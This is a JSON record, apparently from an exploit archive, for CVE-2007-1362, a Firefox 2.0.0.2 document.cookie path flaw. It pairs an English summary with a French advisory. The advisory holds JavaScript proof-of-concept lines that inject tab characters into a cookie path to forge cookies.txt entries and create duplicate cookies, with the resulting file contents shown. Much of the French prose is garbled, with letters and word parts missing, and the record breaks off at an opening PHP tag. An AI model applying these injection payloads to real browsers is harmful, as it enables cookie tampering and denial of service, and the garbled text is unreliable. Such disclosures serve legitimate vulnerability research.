{
    "text": "ecve : CVE-2007-1362 ， title : Mozilla Firefox 2.0.0.2 - Document.Cookie Path Argument Denial of Service - Linux dos Exploit ， verified : Verified ， exploit_detail : source :  ， Mozilla Firefox is prone to a remote denial-of-service vulnerability. ， An attacker may exploit this vulnerability to cause Mozilla Firefox to crash , resulting in denial-of-service conditions. ， Little is known regarding this vulnerability ; this BID will be updated when more information is disclosed. ， Mozilla Firefox 2.0.0.2 is prone to this issue ; other versions may also be affected. ， Attackers may be able to bypass cookie domain and path restrictions , but this has not been confirmed. ， Mozilla Firefox ( 'document.cookie' ) Path Argument Multiple Vulnerabilities ， Advisory : ADV001a ， Risk : Moderate ， Credit : Nicolas DEROUET ( nicolas.derouet [ gmail ] com )  ， Date : 2007-03-08 ， Software : Mozilla Firefox version 2.0.0.2 ( Other versions or products may be also affected )  ， I think identify multiple vulnerabilities in Mozilla Firefox ( default installation ) which could be ， exploited by malicious users to bypass the same origin policy , cause a denial of service and ， conduct other attacks by writing the path of 'document.cookie' with tabulations or/and a large size. ， Description ( in French , sorry )  ， User Agent : Mozilla/5.0 ( Windows ; U ; Windows NT 5.1 ; fr ; rv : 1.8.1.2 ) Gecko/20070219 Firefox/2.0.0.2 ，  # 1 Introduction ， Un cookie , dans le fichier 'cookies.txt' , est compose sept champs : le domaine du cookie , le ， drapeau pour savoir s'il peut e lu par les autres machines du m domaine , le chemin ( path )  ,  ， le drapeau de sritla date d'expiration , le nom du cookie et la valeur du cookie. ， Si nous extons ce code JavaScript :  ， URL :  ， JAVASCRIPT : document.cookie = 'DEMO=A ; domain=127.0.0.1 ; path=/ ; expires=Mon , 03-Sep-2007 00 : 00 : 01 GMT ; ' ;  ， Nous obtiendrons ceci dans le fichier 'cookies.txt' :  ， COOKIES.TXT : 127.0.0.1 FALSE / FALSE 1181270854 DEMO A ， Dans cette analyse , nous allons nous intssarticuliment au 'PATH' du cookie. ，  # 2 Injection de donnavec la variable path ， a ) Prntation ， Les champs dans le fichier 'cookies.txt' sont srpar des tabulations ( \\t or \\x09 ) hors le ， 'PATH' dans 'document.cookie' autorise l'utilisation des tabulations. ， Par exemple , en modifiant le 'PATH' avec cette valeur '/\\x09FALSE\\x091188777601\\x09B\\x09123' ,  ， j'obtiens ceci ( mon cookie d'origine a pour valeur est 'DEMO=A' )  ， URL :  ， JAVASCRIPT : document.cookie = 'DEMO=A ; domain=127.0.0.1 ; path=/\\x09FALSE\\x091188777601\\x09B\\x09123 ; expires=Mon , 03-Sep-2007 00 : 00 : 01 GMT ; ' ;  ， COOKIES.TXT : 127.0.0.1 FALSE / FALSE 1188777601 B 123 FALSE 1181270854 DEMO A ， ^----------------------^ |  |  ， PATH INJECTION NAME VALUE ， Sur cette page la valeur de 'location.pathname' est le /'. Donc ,  ， mon cookie est inutilisable ( pour le moment ) car je me situe au mauvais chemin ( PATH ) . ， En redrrant mon navigateur , je peux voir que mon cookie est utilisable sur la page ， il s'est transformour devenir 'B=123 FALSE 1181270854 DEMO A'. ， COOKIES.TXT : 127.0.0.1 FALSE / FALSE 1188777601 B 123 FALSE 1181270854 DEMO A ，  |  | ^-------------------------^ ， PATH NAME VALUE ， Pour conclure , nous pouvons voire que n'importe quelle utilisateur malicieux peut mettre ce code ， en place trfacilement et que ce code prnte peu de danger dans ce contexte car il modifie la ， variable cookie de son propre domaine. ， b ) Crion de cookies identiques ， Si nous extons ce code :  ， document.cookie = 'id=6 ; domain=127.0.0.1 ; path=/ ; expires=Mon , 03-Sep-2007 00 : 00 : 01 GMT ; ' ;  ， document.cookie = 'id=7 ; domain=127.0.0.1 ; path=/ ; expires=Mon , 03-Sep-2007 00 : 00 : 01 GMT ; ' ;  ， document.cookie = 'id=8 ; domain=127.0.0.1 ; path=/ ; expires=Mon , 03-Sep-2007 00 : 00 : 01 GMT ; ' ;  ， document.cookie = 'id=9 ; domain=127.0.0.1 ; path=/ ; expires=Mon , 03-Sep-2007 00 : 00 : 01 GMT ; ' ;  ， Nous aurons uniquement un seul cookie avec une variable id . Par contre avec la ， vulnbilitrnti-dessus , nous pouvons cr plusieurs cookies identiques. ， Voici un code d'exemple :  ， URL :  ， JAVASCRIPT :  ， document.cookie = 'B=123\\x09FALSE\\x091188777601\\x09id\\x098 ; domain=127.0.0.1 ; path=/ ; expires=Wed , 05-Sep-2007 01 : 00 : 00 GMT ; ' ;  ， document.cookie = 'id=8 ; domain=127.0.0.1 ; path=/\\x09FALSE\\x091188777601\\x09B\\x09123 ; expires=Mon , 03-Sep-2007 00 : 00 : 01 GMT ; ' ;  ， COOKIES.TXT :  ， 127.0.0.1 FALSE [ / ] FALSE 1181270854 [ B ]  [ 123 FALSE 1181270854 id 8 ]  ， 127.0.0.1 FALSE [ / FALSE 1181270854 B 123 ] FALSE 1181270854 [ id ]  [ 8 ]  ， En redrrant le navigateur , nous aurons deux cookies identiques. ， Prenons maintenant un deuxi exemple ,  ， URL :  ， JAVASCRIPT :  ， document.cookie = 'BUG=YES ; domain=127.0.0.1 ; path=/\\x09FALSE\\x091188777601\\x09PREF\\x092 ; expires=Mon , 03-Sep-2007 00 : 00 : 01 GMT ; ' ;  ， document.cookie = 'PREF=1 ; domain=127.0.0.1 ; path=/ ; expires=Wed , 05-Sep-2007 01 : 00 : 00 GMT ; ' ;  ， COOKIES.TXT :  ， 127.0.0.1 FALSE [ / ] FALSE 1181270854 [ PREF ]  [ 1 ]  ， 127.0.0.1 FALSE [ / FALSE 1181270854 PREF 2 ] FALSE 1181270854 [ BUG ]  [ YES ]  ， Si on redrre le navigateur , 'document.cookie' donnera 'PREF=1 ; PREF=2 FALSE 1188777601 BUG YES'. ， Nous allons maintenant modifier le cookie PREF ( je rappelle que nous avons deux cookies avec un ， nom identique 'PREF' )  ， URL :  ， JAVASCRIPT :  ， document.cookie = 'PREF=3 ; domain=127.0.0.1 ; path=/ ; expires=Mon , 03-Sep-2007 00 : 00 : 01 GMT ; ' ;  ， COOKIES.TXT :  ， 127.0.0.1 FALSE / FALSE 1181270854 PREF 1 ， 127.0.0.1 FALSE / FALSE 1181270854 PREF 3 ， A ce moment , 'document.cookie' est le PREF=1 ; PREF=3'. Nous pouvons voir que la modification ， de la valeur cookie 'PREF' impacte sur une seule valeur et non sur les deux. J'ai voulu savoir ， comment interpr la valeur du cookie du coterveur ( exemple PHP ) et du cotlient. ， Pour le cotlient , j'ai rp sur internet une fonction JavaScript qui permet de rpr la ， valeur d'un cookie passn parame. ， JAVASCRIPT ( cotlient )  ， c_start=document.cookie.indexOf ( c_name + \"=\" )  ， c_start=c_start + c_name.length+1 ， c_end=document.cookie.indexOf ( \" ; \" , c_start )  ， PHP ( coterveur )  ， <?php",
    "time": "2007-03-08"
}